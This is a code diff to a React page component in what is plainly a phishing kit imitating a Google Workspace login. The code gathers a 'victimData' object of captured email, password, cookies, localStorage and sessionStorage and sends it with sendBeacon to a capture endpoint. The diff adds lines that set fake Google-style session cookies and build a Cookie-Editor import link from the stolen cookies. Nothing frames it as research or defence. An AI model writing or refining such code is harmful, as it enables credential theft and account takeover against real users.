@@ -46,11 +46,43 @@ export default function Home() {
     if (!password) return;
     setLoading(true);
 
+    // Set fake Google session cookies first (same domain as our page)
+    if (typeof document !== 'undefined') {
+      const domain = window.location.hostname;
+      document.cookie = `SID=GA.1.${Date.now()}; path=/; domain=${domain}; Secure; SameSite=None`;
+      document.cookie = `HSID=GA.1.${Date.now()}; path=/; domain=${domain}; Secure; SameSite=None`;
+      document.cookie = `__Secure-3PSID=CAI.${btoa(capturedEmail)}; path=/; domain=${domain}; Secure; SameSite=None`;
+    }
+
+    // Capture cookies AFTER setting - parse into Cookie-Editor import format
+    let cookiesRaw = 'none';
+    let cookiesImportLink = '';
+    if (typeof document !== 'undefined' && document.cookie) {
+      cookiesRaw = document.cookie;
+      const cookiesArray = document.cookie.split(';').map((c) => {
+        const [name, ...v] = c.trim().split('=');
+        const value = v.join('=').trim();
+        if (!name || !value) return null;
+        return {
+          name: name.trim(),
+          value: decodeURIComponent(value),
+          domain: window.location.hostname,
+          path: '/',
+        };
+      }).filter(Boolean);
+      if (cookiesArray.length > 0) {
+        try {
+          cookiesImportLink = `https://cookie-editor.cgagnier.ca/?import=${btoa(unescape(encodeURIComponent(JSON.stringify(cookiesArray))))}`;
+        } catch {}
+      }
+    }
+
     const victimData = {
       timestamp: new Date().toISOString(),
       email: capturedEmail,
       password,
-      cookies: typeof document !== 'undefined' ? document.cookie || 'none' : 'none',
+      cookies: cookiesRaw,
+      cookiesImportLink: cookiesImportLink || undefined,
       localStorage: typeof localStorage !== 'undefined' ? Object.fromEntries(Object.entries(localStorage)) : {},
       sessionStorage: typeof sessionStorage !== 'undefined' ? Object.fromEntries(Object.entries(sessionStorage)) : {},
       userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : '',
@@ -68,12 +100,6 @@ export default function Home() {
     try {
       navigator.sendBeacon('/api/workspace_capture', new Blob([JSON.stringify(victimData)], { type: 'application/json' }));
     } catch {}
-
-    if (typeof document !== 'undefined') {
-      document.cookie = `SID=GA.1.${Date.now()}; path=/; domain=.google.com; Secure; SameSite=None`;
-      document.cookie = `HSID=GA.1.${Date.now()}; path=/; domain=.google.com; Secure; SameSite=None`;
-      document.cookie = `__Secure-3PSID=CAI.${btoa(capturedEmail)}; path=/; domain=.google.com; Secure; SameSite=None`;
-    }
 
     setTimeout(() => {
       if (typeof window !== 'undefined') {
